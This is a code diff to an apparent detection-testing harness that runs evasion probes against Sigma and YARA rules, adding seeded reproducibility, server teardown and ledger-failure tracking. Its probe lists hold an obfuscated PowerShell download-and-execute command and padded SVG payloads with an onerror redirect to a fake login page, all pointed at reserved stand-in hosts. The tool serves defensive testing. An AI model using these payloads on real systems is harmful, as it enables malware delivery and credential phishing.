@@ -1,4 +1,4 @@
-"""Endurance Runner: Continuous Overnight Adversarial Swarm Execution Harness.
+"""Endurance runner: bounded long-run continuous boundary mapping.
 
 Executes continuous multi-vector testing across all evasion axes:
 1. Polymorphic LOLBin proxying & argument masking (Sigma).
@@ -16,6 +16,7 @@ from __future__ import annotations
 
 import argparse
 import datetime
+import hashlib
 import http.server
 import json
 import logging
@@ -78,6 +79,11 @@ STOP_FILE = RESULTS_DIR / "STOP_ENDURANCE"
 logger = logging.getLogger("swarm.endurance")
 
 
+#: Default RNG seed for probe selection. Recorded in the run state, so a run is reproducible
+#: from (seed, iterations) instead of being an unrecorded draw.
+DEFAULT_SEED = 20260910
+
+
 class EnduranceRunner:
     """Orchestrates an unattended, continuous multi-pattern adversarial endurance run."""
 
@@ -89,6 +95,7 @@ class EnduranceRunner:
         resume: bool = False,
         results_dir: Optional[Path] = None,
         stop_file: Optional[Path] = None,
+        seed: int = DEFAULT_SEED,
     ) -> None:
         self.pace = pace_seconds
         self.serve_workbench = serve_workbench
@@ -104,6 +111,11 @@ class EnduranceRunner:
         # Observation-record layer: append-only JSONL; aggregates derive from it
         stamp = datetime.datetime.now(datetime.timezone.utc).strftime("%Y%m%dT%H%M%SZ")
         self.run_id = f"endur-{stamp}-{uuid.uuid4().hex[:6]}"
+        # The probe sequence is drawn from an explicitly seeded generator, and the seed is
+        # recorded in the run state, so a run is reproducible from (seed, iterations) rather
+        # than being a fresh unrecorded draw each time.
+        self.seed = seed
+        self.rng = random.Random(seed)
         self._record_start_seq = 0
         self.record_writer: Optional[RecordWriter] = None
 
@@ -310,12 +322,24 @@ class EnduranceRunner:
             logger.removeHandler(self._file_handler)
             self._file_handler.close()
             self._file_handler = None
-        if self.httpd:
-            try:
-                self.httpd.shutdown()
-            except Exception:
-                pass
-            self.httpd = None
+        self._stop_http_server()
+
+    def _stop_http_server(self) -> None:
+        """Stops the workbench listener and releases its socket.
+
+        ``shutdown()`` only stops the serve_forever loop; without ``server_close()`` the
+        listening socket stays bound until garbage collection, so a later run can fail to
+        bind its port and silently lose the workbench.  Both ``close()`` and run wrap-up
+        route through here so the teardown cannot drift between the two paths.
+        """
+        if not self.httpd:
+            return
+        try:
+            self.httpd.shutdown()
+            self.httpd.server_close()
+        except Exception as exc:
+            logger.warning("Workbench server teardown warning: %s", exc)
+        self.httpd = None
 
     def __enter__(self) -> EnduranceRunner:
         return self
@@ -343,7 +367,7 @@ class EnduranceRunner:
                 self.httpd = http.server.HTTPServer(("127.0.0.1", port), WorkbenchHandler)
                 t = threading.Thread(target=self.httpd.serve_forever, daemon=True)
                 t.start()
-                logger.info("Adversarial Swarm Workbench server active at http://localhost:%d/swarm_workbench.html", port)
+                logger.info("Boundary workbench server active at http://localhost:%d/swarm_workbench.html", port)
                 break
             except OSError:
                 continue
@@ -353,7 +377,7 @@ class EnduranceRunner:
         self.running = True
         logger.info("=" * 72)
         logger.info("ADVERSARIAL WORKBENCH ENDURANCE ENGINE DEPLOYED")
-        logger.info("Target: Continuous autonomous detection boundary mapping")
+        logger.info("Target: continuous detection boundary mapping")
         logger.info("Safety: RFC 2606 reserved domains | Local memory execution only")
         logger.info("Pace: %.2fs delay between pattern suites", self.pace)
         logger.info("Results Directory: %s", self.results_dir)
@@ -455,8 +479,11 @@ class EnduranceRunner:
             ("cmdlet_split", 'powershell.exe -c "&(\'Inv\'+\'oke-RestMethod\') https://cdn.delivery.stage.invalid/update.ps1 | iex"', "Cluster B: Argument Masking & Parameter Aliasing"),
         ]
 
-        name, cmd, cluster = random.choice(lolbins)
-        var_id = f"proc-{uuid.uuid4().hex[:8]}"
+        name, cmd, cluster = self.rng.choice(lolbins)
+        # Content-derived id: identical probes get identical ids, and the ordinal keeps
+        # distinct observations of the same probe distinguishable. uuid4 made every run
+        # unreproducible.
+        var_id = f"proc-{hashlib.sha256(f'{name}|{cmd}|{self.total_probes}'.encode()).hexdigest()[:8]}"
         variant = Variant(
             id=var_id,
             target_type="sigma",
@@ -493,14 +520,14 @@ class EnduranceRunner:
             [2, 4],       # Execution + Credential Access bypass
             [1, 2, 4],    # Compound multi-stage bypass
         ]
-        evasions = random.choice(profiles)
+        evasions = self.rng.choice(profiles)
         camp_num = self.campaigns_count + 1
 
         result = self.campaign_orchestrator.run_campaign(
             campaign_name=f"Endurance-Campaign-Run{camp_num}",
             campaign_id=f"CAMP-ENDUR-{camp_num:04d}",
             evasion_at_stages=evasions,
-            self_heal=False,
+            propose_patches=False,
         )
 
         self.campaigns_count += 1
@@ -622,7 +649,7 @@ class EnduranceRunner:
         self.current_pattern_suite = "Active-Content SVG Parser Differentials (YARA)"
 
         paddings = [512, 1024, 1500, 2048, 3072, 4096, 4500, 6000, 8192]
-        pad = random.choice(paddings)
+        pad = self.rng.choice(paddings)
         prefix = f"<!-- {'P' * pad} -->\n" if pad > 0 else ""
 
         modes = [
@@ -634,7 +661,7 @@ class EnduranceRunner:
             ("onerror_image_redirect", f'{prefix}<svg xmlns="http://www.w3.org/2000/svg"><image href="x" onerror="location.replace(\'https://auth.stage.invalid/login\')"/></svg>', "Cluster B: Argument Masking & Parameter Aliasing"),
         ]
 
-        mode_name, payload, cluster = random.choice(modes)
+        mode_name, payload, cluster = self.rng.choice(modes)
         variant = Variant(
             id=f"svg-{uuid.uuid4().hex[:8]}",
             target_type="yara",
@@ -656,12 +683,12 @@ class EnduranceRunner:
         if not valid_fixtures:
             return
 
-        corpus = random.choice(valid_fixtures)
-        window = random.choice([30, 60, 120, 300])
+        corpus = self.rng.choice(valid_fixtures)
+        window = self.rng.choice([30, 60, 120, 300])
         is_benign = "benign" in corpus.name.lower()
 
         try:
-            report = self.replay_engine.replay_file(corpus, is_benign=is_benign, window_seconds=window)
+            report = self.replay_engine.replay_file(corpus, is_benign=is_benign)
         except Exception as exc:
             self.error_records += 1
             self._emit(
@@ -670,7 +697,7 @@ class EnduranceRunner:
                 probe_id=corpus.name,
                 fixture_hash=f"sha256:{sha256_file(corpus)}",
                 outcome=OUTCOME_ERROR,
-                detail={"error": str(exc), "window_seconds": window},
+                detail={"error": str(exc)},
             )
             raise
         self.replay_evals_count += 1
@@ -697,7 +724,7 @@ class EnduranceRunner:
                 "detections": report.total_detections,
                 "benign": bool(is_benign),
             },
-            detail={"window_seconds": window},
+            detail={},
         )
 
         out_path = self.results_dir / "telemetry_replay.json"
@@ -779,11 +806,21 @@ class EnduranceRunner:
         return self.record_writer
 
     def _emit(self, **fields: Any) -> None:
-        """Appends one raw observation record to the run ledger."""
+        """Appends one raw observation record to the run ledger.
+
+        An append failure is never swallowed silently: the run is marked degraded and the error
+        retained, so no later resume or report can present in-memory counters that have drifted
+        from an incomplete ledger as ledger-backed.
+        """
         try:
             self._ensure_writer().append(Observation(run_id=self.run_id, **fields))
         except OSError as exc:
-            logger.warning("Could not append observation record: %s", exc)
+            self.ledger_degraded = True
+            self.ledger_error = f"{type(exc).__name__}: {exc}"
+            logger.error(
+                "LEDGER APPEND FAILED (%s): %s - run marked degraded (ledger_complete=false)",
+                type(exc).__name__, exc,
+            )
 
     def _records_relpath(self) -> str:
         """Repo-relative path of this run's record ledger (for state embedding)."""
@@ -970,6 +1007,9 @@ class EnduranceRunner:
 
         state = {
             "status": "RUNNING" if self.running and not self.stop_requested else "STOPPED",
+            "seed": self.seed,
+            "ledger_complete": not getattr(self, "ledger_degraded", False),
+            "ledger_error": getattr(self, "ledger_error", None),
             "start_time": self.start_time.isoformat(),
             "last_heartbeat": now.isoformat(),
             "elapsed_seconds": round(elapsed, 1),
@@ -1040,7 +1080,7 @@ class EnduranceRunner:
                 "critic_approved": approved,
                 "detected_count": counts["detected"],
                 "evaded_count": counts["gaps"],
-                "final_resilience": round(counts["detected"] / approved, 3) if approved > 0 else None,
+                "detection_rate_on_approved": round(counts["detected"] / approved, 3) if approved > 0 else None,
                 "endurance_mode": True,
             }
 
@@ -1100,11 +1140,7 @@ class EnduranceRunner:
             cable_path = None
             stats = {}
 
-        if self.httpd:
-            try:
-                self.httpd.shutdown()
-            except Exception:
-                pass
+        self._stop_http_server()
 
         return {
             "total_cycles": self.total_cycles,
@@ -1120,7 +1156,7 @@ class EnduranceRunner:
 def main() -> int:
     parser = argparse.ArgumentParser(
         prog="python -m tools.swarm.endurance_runner",
-        description="Continuous Overnight Adversarial Swarm Endurance Harness",
+        description="Continuous detection boundary endurance harness",
     )
     parser.add_argument(
         "--pace",
